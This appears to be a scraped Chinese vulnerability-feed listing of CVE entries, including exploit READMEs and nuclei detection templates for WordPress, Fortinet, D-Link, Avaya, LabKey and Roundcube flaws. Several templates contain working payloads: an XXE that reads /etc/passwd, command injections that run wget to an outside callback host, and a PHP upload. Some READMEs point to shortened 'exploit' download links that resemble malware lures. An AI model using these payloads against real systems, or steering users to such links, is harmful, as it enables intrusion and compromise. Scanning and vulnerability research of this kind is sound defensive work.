posts.title: WP Directorybox Manager 认证绕过漏洞
posts.text: 漏洞名称： WP Directorybox Manager 认证绕过漏洞 漏洞编号： CVE： CVE-2025-0316 漏洞类型： 权限绕过 漏洞等级： 高危 漏洞描述： WP Directorybox Manager插件在2.5及以下版本中存在认证绕过漏洞，由于’wp_dp_enquiry_agent_contact_form_submit_callback’函数中的认证不正确，未认证的攻击者可以以任何现有用户（如管理员）的身份登录网站，前提是他们知道用户名。 产品厂商： WordPress 产品名称： WP Directorybox Manager 影响版本： <= 2.5 来源： https://github.com/AvonBorn/CVE-2025-0316-Exploit 类型： CVE-2025:github search 12345678910111213141516171819202122# CVE-2025-0316 ## Details+ **CVE ID**: CVE-2025-0316 + **Published**: 02/08/2025+ **CVSS**: 9.8+ **Patch Available: (No official patch yet)**## ImpactThe WP Directorybox Manager plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 2.5. This is due to incorrect authentication in the 'wp_dp_enquiry_agent_contact_form_submit_callback' function. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the username.## Affected Versions WP Directorybox Manager<= 2.5### [Download here](https://tinyurl.com/2ytp7dad)## Contact+ **For inquiries, please contact:avonbergs@outlook.com** 1234- README.md

posts.title: PHPGurukul Hostel Management System 存储型跨站脚本漏洞
posts.text: 漏洞名称： PHPGurukul Hostel Management System 存储型跨站脚本漏洞 漏洞编号： CVE： CVE-2025 漏洞类型： 跨站可执行脚本 漏洞等级： 高危 漏洞描述： 在PHPGurukul的Hostel Management System中发现了一个严重的存储型跨站脚本(XSS)漏洞。攻击者可以通过名称字段(POST参数)注入恶意JavaScript，这些脚本会被持久存储在数据库中，并在查看个人资料页面时执行。漏洞存在于投诉系统模块，攻击向量是通过POST请求的name参数。 产品厂商： PHPGurukul 产品名称： Hostel Management System 来源： https://github.com/Vanshdhawan188/CVE-2025-PHPGurukul-Hostel-management-system 类型： CVE-2025:github search 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455## Authors / Discovery Team:- **Founder**: Subhash PaudelA critical Stored Cross-Site Scripting (XSS) vulnerability was discovered in project file of PHPGurukul's Hostel Management System.Attackers can inject malicious JavaScript via the name field (POST parameter), which gets persistently stored in the database and executed whenever the profile page is viewed. Key DetailsProperty ValueAffected Vendor PHPGurukulAffected Module Complaint SystemAttack Vector name parameter via POST requestVulnerability Type Stored Cross-Site Scripting (XSS)Input Field Course Name / Course Short NameOfficial Website Hostel Management SystemProof of Concept (PoC)Step-by-Step ExploitationLogin to the Hostel Student Panel: • Navigate to the login portal and authenticate using valid admin credentials. • http://localhost/hostel/ Inject XSS Payload in Complaint Section:http://localhost/hostel/register-complaint.phpPaste the following payload in the "Explain the Complaint" input field and click Submit:<script>alert(Subhash Paudel)</script>3. Success MessageA confirmation message will appear stating that your complaint has been added successfully. 4. Trigger the Payload Navigate to the My Complaints section And select your complaint. You’ll see a JavaScript alert(subhash paudel) triggered — confirming the stored XSS vulnerability. http://localhost/hostel/my-complaints.php Stored XSS Potential • User input stored in DB: Malicious scripts submitted via forms, comments, or profile fields. • Displayed unsanitized: Output shown in HTML without proper escaping. • Persistent attack: Script runs whenever any user views the infected page. • Common targets: Forums, admin dashboards, comment sections, user profiles. • Can hijack sessions: Steal cookies, deface content, or redirect users. • Executed in victim’s browser: Runs with the same origin privileges. Stored XSS Mitigations • Escape output: Encode HTML entities before rendering (< → &lt;, etc.). • Use CSP (Content Security Policy): Block inline scripts and limit script sources. • Input validation: Reject unexpected tags or scripts at submission time. • Sanitize inputs: Strip dangerous HTML/JS using libraries (e.g., DOMPurify). • HTTP-only cookies: Prevent cookie theft via document.cookie. • Use frameworks securely: Rely on built-in auto-escaping (React, Angular, etc.). • Security headers: Add X-XSS-Protection, Content-Type, and X-Content-Type-Options. 1234- README.md

posts.title: WordPress HyperComments Plugin 权限提升漏洞
posts.text: 漏洞名称： WordPress HyperComments Plugin 权限提升漏洞 漏洞编号： CVE： CVE-2025-5701 漏洞类型： 权限提升 漏洞等级： 严重 漏洞描述： WordPress的HyperComments插件1.2.2及以下版本存在权限提升漏洞，由于hc_request_handler函数中缺少能力检查，未经认证的攻击者可以修改任意的WordPress选项，如启用用户注册和更改新注册用户的默认角色为管理员，从而导致权限提升。 产品厂商： WordPress 产品名称： HyperComments Plugin 影响版本： <= 1.2.2 来源： https://github.com/Nxploited/CVE-2025-5701 类型： CVE-2025:github search 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# CVE-2025-5701 - Unauthenticated Privilege Escalation Exploit**Severity:** CRITICAL (CVSS 9.8) **Plugin Affected:** HyperComments for WordPress **Versions Affected:** ≤ 1.2.2---## 📌 Vulnerability SummaryThe **HyperComments** plugin for WordPress is vulnerable to unauthorized modification of WordPress options due to a missing capability check in the \`hc_request_handler\` function. This allows **unauthenticated attackers** to update **arbitrary WordPress options**, such as:- Enabling user registration (\`users_can_register\`)- Changing the default role assigned to newly registered users (\`default_role\`)By chaining these together, an attacker can enable registration and ensure any new user is automatically granted the **Administrator** role.---### 🧨 CVSS Score\`\`\`CVSS v3.1: 9.8 CRITICAL AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H\`\`\`---## 📦 Usage\`\`\`CVE-2025-5701 - Unauthenticated Privilege Escalation ExploitAuthor: Khaled Alenazi (Nxploited)usage: a.py [-h] -u URLCVE-2025-5701 - Unauthenticated Privilege Escalation Exploit by Khaled Alenazi (Nxploited)options: -h, --help show this help message and exit -u, --url URL Target base URL (e.g., http://target-site.com)\`\`\`---## 💬 Example Output\`\`\`CVE-2025-5701 - Unauthenticated Privilege Escalation ExploitAuthor: Khaled Alenazi (Nxploited)[+] Target is vulnerable (version: 1.2.2) - proceeding with exploitation.[+] Exploit endpoint is accessible.[+] Server response: {"result":"success"}[+] Registration is now enabled. New users will be assigned administrator role.[+] Register here: http://target-site.com/wp-login.php?action=registerExploit by: Khaled Alenazi (Nxploited)\`\`\`---## ⚠️ DisclaimerThis script is provided for **educational purposes only**. Unauthorized access to systems without permission is illegal and unethical. Use only in controlled environments or with explicit authorization.---*Nxploited (Khaled_alenazi)* 1234- README.md

posts.title: GreatPages.com.br 域名接管漏洞
posts.text: 漏洞名称： GreatPages.com.br 域名接管漏洞 漏洞类型： 未授权访问 漏洞等级： 高危 漏洞描述： 检测指向greatpages.com.br服务的域名存在潜在的域名接管漏洞。当DNS记录指向cname.greatpages.com.br但返回HTTP 404时，表明该域名未被认领，可能被接管。 产品厂商： GreatPages.com.br 产品名称： GreatPages.com.br 来源： https://github.com/projectdiscovery/nuclei-templates/blob/b7327bebf324ffc67199d00bd3c32d68b3ce915b/http%2Ftakeovers%2Fgreatpages-takeover.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960id: greatpages-takeoverinfo: name: GreatPages.com.br - Takeover Detection author: juliosmelo severity: high description: | Detects potential domain takeover vulnerability for domains pointing to greatpages.com.br service. The vulnerability occurs when a DNS record points to cname.greatpages.com.br but returns HTTP 404, indicating the domain is unclaimed and can be taken over. reference: - https://github.com/EdOverflow/can-i-take-over-xyz classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N cvss-score: 7.2 cwe-id: CWE-284 metadata: max-request: 2 tags: takeover,dns,greatpagesdns: - name: "{{FQDN}}" type: CNAME class: IN recursion: true retries: 3 matchers: - type: word words: - "cname.greatpages.com.br"http: - method: GET path: - "{{BaseURL}}" matchers-condition: and matchers: - type: status status: - 404 - type: word words: - "404" - "not found" - "page not found" - "não encontrada" - "página não encontrada" condition: or case-insensitive: true extractors: - type: dsl dsl: - 'host' - 'status_code' - 'len(body)'

posts.title: Fortinet 缓冲区溢出漏洞
posts.text: 漏洞名称： Fortinet 缓冲区溢出漏洞 漏洞编号： CVE： CVE-2025-32756 漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： CVE-2025-32756是影响多个Fortinet产品的严重栈缓冲区溢出漏洞。该漏洞存在于处理/remote/hostcheck_validate端点的enc参数时，由于不正确的边界检查导致缓冲区溢出，允许未经认证的远程代码执行。受影响的Fortinet产品包括FortiVoice、FortiMail、FortiNDR、FortiRecorder和FortiCamera。 产品厂商： Fortinet 产品名称： FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera 影响版本： FortiVoice: version < 7.2.1, version < 7.0.7, version < 6.4.11; FortiMail: version < 7.6.3, version < 7.4.5, version < 7.2.8, version < 7.0.9; FortiNDR: version < 7.6.1, version < 7.4.8, version < 7.2.5, version < 7.0.7; FortiRecorder: version < 7.2.4, version < 7.0.6, version < 6.4.6; FortiCamera: version < 2.1.4 来源： https://github.com/kn0x0x/CVE-2025-32756-POC 类型： CVE-2025:github search 123456789101112131415161718192021222324252627282930313233343536373839# CVE-2025-32756: Fortinet RCE PoCA proof-of-concept for the critical stack-based buffer overflow vulnerability (CVE-2025-32756) affecting Fortinet products.## Vulnerability- **CVSS**: 9.8 (Critical)- **Type**: Stack-based buffer overflow in AuthHash cookie processing- **Impact**: Unauthenticated remote code execution- **Affected Products**: FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCameraThe vulnerability exists in the processing of the \`enc\` parameter in the \`/remote/hostcheck_validate\` endpoint, where improper bounds checking allows buffer overflow.## Usage\`\`\`python3 fortinet_cve_2025_32756_poc.py target_ip [-p port] [-d]\`\`\`### Arguments:- \`target_ip\`: Target Fortinet device- \`-p, --port\`: Target port (default: 443)- \`-d, --debug\`: Enable debug output## MitigationUpdate to patched versions:- FortiVoice: 7.2.1+, 7.0.7+, 6.4.11+- FortiMail: 7.6.3+, 7.4.5+, 7.2.8+, 7.0.9+- FortiNDR: 7.6.1+, 7.4.8+, 7.2.5+, 7.0.7+- FortiRecorder: 7.2.4+, 7.0.6+, 6.4.6+- FortiCamera: 2.1.4+## DisclaimerFor educational and research purposes only. Use only against systems you own or have permission to test. 1234567- .gitignore- README.md- fortinet_cve_2025_32756_poc.py- requirements.txt

posts.title: HyperComments WordPress 权限提升漏洞
posts.text: 漏洞名称： HyperComments WordPress 权限提升漏洞 漏洞编号： CVE： CVE-2025-5701 漏洞类型： 权限提升 漏洞等级： 高危 漏洞描述： HyperComments WordPress插件存在权限提升漏洞，由于在hc_request_handler函数中缺少能力检查，攻击者可以未经授权修改数据，导致权限提升。此漏洞允许未认证的攻击者更新WordPress站点上的任意选项，包括将注册默认角色更新为管理员，并启用用户注册，从而获得对受影响站点的管理员用户访问权限。 产品厂商： HyperComments 产品名称： HyperComments WordPress Plugin 影响版本： version <= 1.2.2 来源： https://github.com/Harley21211/CVE-2025-5701-Exploit 类型： CVE-2025:github search 1234567891011121314151617181920# CVE-2025-5701 - HyperComments WordPress Privilege Escalation Vulnerability## Exploit:### [Download here](https://tinyurl.com/ypnm6cpe)## Details+ **CVE ID**: CVE-2025-5701+ **Published**: 6/5/2025+ **CVSS**: 9.8+ **Patch Available: (No official patch yet)**## ImpactThe HyperComments plugin for WordPress is vulnerable to unauthorized modification of data that can lead to privilege escalation due to a missing capability check on the hc_request_handler function in all versions up to, and including, 1.2.2. This makes it possible for unauthenticated attackers to update arbitrary options on the WordPress site. This can be leveraged to update the default role for registration to administrator and enable user registration for attackers to gain administrative user access to a vulnerable site.## Contact+ **For inquiries, please contact:johntabs21@outlook.com** 1234- README.md

posts.title: Google Chrome V8 Out-of-Bounds Write Vulnerability
posts.text: 漏洞名称： Google Chrome V8 Out-of-Bounds Write Vulnerability 漏洞编号： CVE： CVE-2025-5419 漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： Google Chrome V8 JavaScript引擎中存在一个严重的越界写入漏洞（CVE-2025-5419），影响版本至137.0.7151.68。该漏洞源于V8在优化的JIT编译过程中不当处理内存边界。在特定条件下，攻击者可以通过精心构造的HTML+JavaScript负载触发内存损坏，导致堆损坏和远程代码执行。漏洞利用需要用户交互（如访问恶意网站），无需认证。 产品厂商： Google 产品名称： Google Chrome 影响版本： ≤ 137.0.7151.68 来源： https://github.com/takerishunte/CVE-2025-5419 类型： CVE-2025:github search 123456789101112131415161718192021222324252627282930313233# Remote Code Execution via Out-of-Bounds Write in Google Chrome V8 (CVE-2025-5419)🧠 DescriptionThis repository contains a proof-of-concept (PoC) exploit for a CVE-2025-5419, a critical out-of-bounds write vulnerability discovered in the V8 JavaScript engine used by Google Chrome. The flaw was present in versions up to 137.0.7151.68.The vulnerability arises when V8 improperly handles memory bounds during optimized JIT compilation. Under specific conditions, an attacker can trigger memory corruption through a crafted HTML+JavaScript payload, leading to heap corruption and remote code execution.---🔍 CVE Details- CVE ID: CVE-2025-5419- Vendor: Google- Affected Versions: Chrome ≤ 137.0.7151.68- Vulnerability Type: Out-of-Bounds Write- Impact: Remote Code Execution (RCE)- Exploitability: Remote, via Web Browser- Authentication Required: No- User Interaction Required: Yes (e.g. visiting a malicious site)---⚙️ Technical SummaryThe issue lies in how V8 manages dynamic array allocations during speculative optimizations. In certain JIT-optimized paths, type confusion allows a JS object to gain out-of-bounds access to adjacent heap memory, which may contain critical metadata or executable code regions.When triggered via malicious web content, this can lead to heap corruption and controlled writes, enabling shellcode injection or ROP chain execution in a sandboxed renderer process. While sandbox escape is not included in this PoC, the vulnerability forms a viable first-stage in a full browser exploit chain.---[Download](https://tinyurl.com/27bmzss5) 1234- README.md

posts.title: Apache Spark Application UI 未授权访问漏洞
posts.text: 漏洞名称： Apache Spark Application UI 未授权访问漏洞 漏洞类型： 未授权访问 漏洞等级： 中危 漏洞描述： 检测到Apache Spark的PySparkShell Application UI在端口4040上暴露。该UI不应暴露在互联网上，因为它可能泄露敏感的作业和集群信息。 产品厂商： apache 产品名称： spark 搜索语法： title:”spark master at” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/58ae82fb572fdc9830d5db8a429ef418681fa568/http%2Fmisconfiguration%2Fapachespark-ui-exposed.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738id: apachespark-ui-exposedinfo: name: Apache Spark Application UI - Exposed author: ritikchaddha severity: medium description: | Detects exposed PySparkShell Application UI by Apache Spark on port 4040. The UI should not be exposed to the internet as it may leak sensitive job and cluster information. reference: - https://spark.apache.org/docs/latest/web-ui.html metadata: verified: true max-request: 1 vendor: apache product: spark shodan-query: title:"spark master at" fofa-query: title="spark master at" tags: spark,pyspark,ui,exposed,panel,apachehttp: - method: GET path: - "{{BaseURL}}:4040/jobs/" matchers-condition: and matchers: - type: word words: - "Spark Jobs" - "application UI" condition: and - type: status status: - 200

posts.title: LabKey Server 19.1.0 - XML External Entity (XXE)
posts.text: 漏洞名称： LabKey Server 19.1.0 - XML External Entity (XXE) 漏洞编号： CVE： CVE-2019-9757 漏洞类型： XML实体注入 漏洞等级： 高危 漏洞描述： LabKey Server 19.1.0版本中存在XML外部实体(XXE)漏洞。攻击者可以通过向visualization-exportImage.view或visualization-exportPDF.view端点发送包含XXE负载的SVG文件，读取本地文件。 产品厂商： labkey 产品名称： labkey_server 影响版本： 19.1.0 搜索语法： title=”LabKey” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/a74860dc4cbb0c18da29b62bab372ed77027f883/http%2Fcves%2F2019%2FCVE-2019-9757.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091id: CVE-2019-9757info: name: LabKey Server 19.1.0 - XML External Entity (XXE) author: ritikchaddha severity: high description: | An issue was discovered in LabKey Server 19.1.0. Sending an SVG containing an XXE payload to the endpoint visualization-exportImage.view or visualization-exportPDF.view allows local files to be read. reference: - https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/ - https://github.com/LabKey/Issues/issues/37636 - https://nvd.nist.gov/vuln/detail/CVE-2019-9757 classification: cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N cvss-score: 7.5 cve-id: CVE-2019-9757 cwe-id: CWE-611 cpe: cpe:2.3:a:labkey:labkey_server:19.1.0:*:*:*:*:*:*:* metadata: max-request: 3 vendor: labkey product: labkey_server shodan-query: title:"LabKey" fofa-query: title="LabKey" tags: cve,cve2019,labkey,xxe,authenticatedflow: http(1) && http(2) && http(3)http: - raw: - | GET /labkey/home/project-begin.view HTTP/1.1 Host: {{Hostname}} extractors: - type: regex name: csrf group: 1 regex: - '"X\-LABKEY\-CSRF":"([0-9a-z]+)"' internal: true - raw: - | POST /home/login-loginApi.api HTTP/1.1 Host: {{Hostname}} X-LABKEY-CSRF: {{csrf}} Content-Type: application/x-www-form-urlencoded; charset=UTF-8 remember=on&email={{username}}&password={{password}}&approvedTermsOfUse=false host-redirects: true matchers: - type: dsl dsl: - 'status_code == 200' - '!status_code == 400' condition: and - raw: - | POST /labkey/home/visualization-exportPDF.view HTTP/1.1 Host: {{Hostname}} Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150 -----------------------------735323031399963166993862150 Content-Disposition: form-data; name="X-LABKEY-CSRF" {{csrf}} -----------------------------735323031399963166993862150 Content-Disposition: form-data; name="svg" <?xml version="1.0" standalone="yes"?> <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg"> <text x="0" y="15" fill="red">&xxe;</text> </svg> -----------------------------735323031399963166993862150 Content-Disposition: form-data; name="title" test -----------------------------735323031399963166993862150-- matchers: - type: dsl dsl: - 'regex("root:.*:0:0:", body)' - 'status_code == 200' condition: and

posts.title: DCBI-Netlog-LAB v1.0 认证绕过 - 命令注入
posts.text: 漏洞名称： DCBI-Netlog-LAB v1.0 认证绕过 - 命令注入 漏洞编号： CVE： CVE-2023-26802 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 的 /network_config/nsg_masq.cgi 组件存在漏洞，允许攻击者通过精心构造的请求绕过认证并执行任意命令。 产品厂商： dcnglobal 产品名称： dcbi-netlog-lab_firmware 影响版本： 1.0 来源： https://github.com/projectdiscovery/nuclei-templates/blob/ed515805186fb4cc7c850109795d00fd3eb2bcdc/http%2Fcves%2F2023%2FCVE-2023-26802.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960id: CVE-2023-26802info: name: DCBI-Netlog-LAB v1.0 authentication - Command Injection author: pussycat0x severity: critical description: | An issue in the component /network_config/nsg_masq.cgi of DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 allows attackers to bypass authentication and execute arbitrary commands via a crafted request. reference: - https://web.archive.org/web/20230605051153/https://github.com/winmt/my-vuls/tree/main/DCN%20DCBI-Netlog-LAB classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-26802 cwe-id: CWE-22 epss-score: 0.00433 epss-percentile: 0.61882 cpe: cpe:2.3:o:dcnglobal:dcbi-netlog-lab_firmware:1.0:*:*:*:*:*:*:* metadata: vendor: dcnglobal product: dcbi-netlog-lab_firmware tags: cve,cve2023,rce,unauth,kev.netlogvariables: file_name: "{{rand_text_alpha(4)}}.html"http: - raw: - | GET /cgi-bin/network_config/nsg_masq.cgi?user_name=admin&session_id=../&lang=zh_CN.UTF-8&act=2&proto=;ls>/usr/local/lyx/lyxcenter/web/{{file_name}}; HTTP/1.1 Host: {{Hostname}} Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close - | GET /{{file_name}} HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close matchers-condition: and matchers: - type: word part: body_2 words: - "nsg_bridge.cgi" - "nsg_dhcpactiveip.cgi" condition: and - type: status status: - 200

posts.title: APSystems ECU-R Firmware 远程代码执行漏洞
posts.text: 漏洞名称： APSystems ECU-R Firmware 远程代码执行漏洞 漏洞编号： CVE： CVE-2022-45699 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： APSystems ECU-R Firmware 存在远程代码执行漏洞，攻击者可以通过向set_timezone端点注入命令来利用此漏洞。 产品厂商： apsystems 产品名称： ecu-r_firmware 影响版本： 5203 来源： https://github.com/projectdiscovery/nuclei-templates/blob/cfdcbc2ce4ab3a170e155ceb2b43c2464d26ada5/http%2Fcves%2F2022%2FCVE-2022-45699.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647id: CVE-2022-45699info: name: APSystems-DS3-RCE-Timezone - Remote Code Execution author: pussycat0x severity: critical description: | This template checks for a remote code execution vulnerability in the set_timezone endpoint. The vulnerability is exploited by injecting a command via the timezone parameter. reference: - https://github.com/0xst4n/APSystems-ECU-R-RCE-Timezone - https://github.com/nomi-sec/PoC-in-GitHub classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2022-45699 cwe-id: CWE-78,CWE-94 epss-score: 0.12693 epss-percentile: 0.93636 cpe: cpe:2.3:o:apsystems:ecu-r_firmware:5203:*:*:*:*:*:*:* metadata: vendor: apsystems product: ecu-r_firmware tags: cve,cve2022,rce,apsystems,kevhttp: - raw: - | POST /index.php/management/set_timezone HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded timezone=;wget+{{interactsh-url}};# matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: Avaya Aura Device Services OS Command Injection Vulnerability
posts.text: 漏洞名称： Avaya Aura Device Services OS Command Injection Vulnerability 漏洞编号： CVE： CVE-2023-3722 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： Avaya Aura Device Services Web应用程序中发现了一个OS命令注入漏洞，通过恶意上传的文件可以以Web服务器用户的身份远程执行代码。此问题影响Avaya Aura Device Services 8.1.4.0及更早版本。 产品厂商： Avaya 产品名称： Avaya Aura Device Services 影响版本： version 8.1.4.0 and earlier 搜索语法： html:”Avaya Aura® Utility Services” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/be3124db4318cd1b25370ae6d9a1a3395cf3cfca/http%2Fcves%2F2023%2FCVE-2023-3722.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364id: CVE-2023-3722info: name: Avaya Aura Device Services - OS Command Injection author: iamnoooob,pdresearch severity: high description: | An OS command injection vulnerability was found in the Avaya Aura Device Services Web application which could allow remote code execution as the Web server user via a malicious uploaded file. This issue affects Avaya Aura Device Services version 8.1.4.0 and earlier. reference: - https://github.com/pizza-power/CVE-2023-3722 - https://download.avaya.com/css/public/documents/101076366 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H cvss-score: 8.6 cve-id: CVE-2023-3722 cwe-id: CWE-434 epss-score: 0.02738 epss-percentile: 0.85305 cpe: cpe:2.3:a:avaya:aura_device_services:*:*:*:*:*:*:*:* metadata: verified: true max-request: 2 vendor: avaya product: aura_device_services shodan-query: html:"Avaya Aura&reg;&nbsp;Utility Services" fofa-query: body="Avaya Aura&reg;&nbsp;Utility Services" tags: cve,cve2023,avaya,rce,upload,deviceservices,intrusivevariables: filename: "{{randbase(8)}}" marker: "{{randstr}}"http: - raw: - | PUT /PhoneBackup/{{filename}}.php HTTP/1.1 Host: {{Hostname}} User-Agent: AVAYA <?phP echo base64_decode($_GET['input']); ?> matchers: - type: dsl dsl: - 'status_code == 201' - 'contains(body, "Resource /PhoneBackup/{{filename}}.php has been created.")' condition: and internal: true - raw: - | GET /PhoneBackup/{{filename}}.php?input={{base64(marker)}} HTTP/1.1 Host: {{Hostname}} User-Agent: AVAYA matchers: - type: dsl dsl: - 'status_code == 200' - 'contains(body, "{{marker}}")' condition: and

posts.title: D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection
posts.text: 漏洞名称： D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection 漏洞编号： CVE： CVE-2023-25280 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： D-Link DIR820LA1_FW105B03中的OS命令注入漏洞允许攻击者通过向ping.ccp的ping_addr参数发送精心构造的负载，将权限提升至root。 产品厂商： dlink 产品名称： dir820la1_firmware 影响版本： 105b03 来源： https://github.com/projectdiscovery/nuclei-templates/blob/37f21b42127661aa20b4f051c80303f36c945338/http%2Fcves%2F2023%2FCVE-2023-25280.yaml 类型： projectdiscovery/nuclei-templates:github issues 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354id: CVE-2023-25280info: name: D-Link DIR820LA1_FW105B03 ping_addr - OS Command Injection author: pussycat0x severity: critical description: | OS Command injection vulnerability in D-Link DIR820LA1_FW105B03 allows attackers to escalate privileges to root via a crafted payload with the ping_addr parameter to ping.ccp. reference: - https://github.com/migraine-sudo/D_Link_Vuln/tree/main/cmd%20Inject%20in%20pingV4Msg - https://www.dlink.com/en/security-bulletin/ - https://github.com/Ostorlab/KEV classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-25280 cwe-id: CWE-78 epss-score: 0.8918 epss-percentile: 0.99516 cpe: cpe:2.3:o:dlink:dir820la1_firmware:105b03:*:*:*:*:*:*:* metadata: vendor: dlink product: dir820la1_firmware tags: cve,cve2023,rce,unauth,kev,dlinkvariables: payload: "wget http://{{interactsh-url}}"http: - raw: - | POST /ping.ccp HTTP/1.1 Host: {{Hostname}} Accept: application/xml, text/xml, */*; q=0.01 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded Origin: {{RootURL}} Referer: http://{{RootURL}}/lan.asp Cookie: hasLogin=1 ccp_act=pingV4Msg&ping_addr=%0a{{payload}}%0a matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

posts.title: Roundcube Webmail 反序列化漏洞
posts.text: 漏洞名称： Roundcube Webmail 反序列化漏洞 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program/actions/settings/upload.php中的_from参数未经过验证，导致经过身份验证的用户可以远程执行代码，引发PHP对象反序列化漏洞。 产品厂商： roundcube 产品名称： webmail 影响版本： version < 1.5.10 or (version >= 1.6.0 and version < 1.6.11) 来源： https://github.com/projectdiscovery/nuclei-templates/blob/9243c22e007e9563ec8780063d12ec132fc232e2/http%2Fcves%2F2025%2FCVE-2025-49113.yaml 类型： projectdiscovery/nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879id: CVE-2025-49113info: name: CVE-2025-49113 author: Ademking severity: critical description: > Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization. reference: - 'https://nvd.nist.gov/vuln/detail/CVE-2025-49113' - 'https://github.com/advisories/GHSA-8j8w-wwqc-x596' - 'https://fearsoff.org/research/roundcube' - 'http://www.openwall.com/lists/oss-security/2025/06/02/3' - 'https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10' classification: cvss-metrics: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H' cvss-score: 10 cve-id: CVE-2025-49113 cwe-id: CWE-502 metadata: vendor: roundcube product: webmail tags: 'roundcube,portal,tech'http: - method: GET path: - "{{BaseURL}}/" matchers-condition: and matchers: - type: word words: - Roundcube - roundcube condition: or part: body - type: regex regex: - '"rcversion":\d\d\d\d' condition: or part: body extractors: - type: regex name: major group: 1 regex: - '"rcversion":(\d)' internal: true - type: regex name: minor group: 1 regex: - '"rcversion":\d\d(\d)' internal: true - type: regex name: patch group: 1 regex: - '"rcversion":\d\d\d(\d+)' internal: true - type: dsl name: version dsl: - major + "." + minor + "." + patch internal: true - type: dsl name: vulnerable dsl: - >- compare_versions(version, '< 1.5.10') || (compare_versions(version, '>= 1.6.0') && compare_versions(version, '< 1.6.11')) internal: true - type: dsl dsl: - '"Version: " + version'

posts.title: Roundcube Webmail PHP对象反序列化漏洞
posts.text: 漏洞名称： Roundcube Webmail PHP对象反序列化漏洞 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Roundcube Webmail 1.5.10之前版本和1.6.x系列中1.6.11之前版本存在远程代码执行漏洞，由于program/actions/settings/upload.php中的_from参数未经验证，导致PHP对象反序列化，攻击者可以利用此漏洞执行任意代码。 产品厂商： roundcube 产品名称： webmail 影响版本： version < 1.5.10 or (1.6.0 <= version < 1.6.11) 来源： https://github.com/projectdiscovery/nuclei-templates/blob/13f98d209dc01fe167328928868a1646fa45d653/http%2Fcves%2F2025%2FCVE-2025-49113.yaml 类型： projectdiscovery/nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980id: CVE-2025-49113info: name: CVE-2025-49113 author: Ademking severity: critical description: > Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the _from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization. reference: - 'https://nvd.nist.gov/vuln/detail/CVE-2025-49113' - 'https://github.com/advisories/GHSA-8j8w-wwqc-x596' - 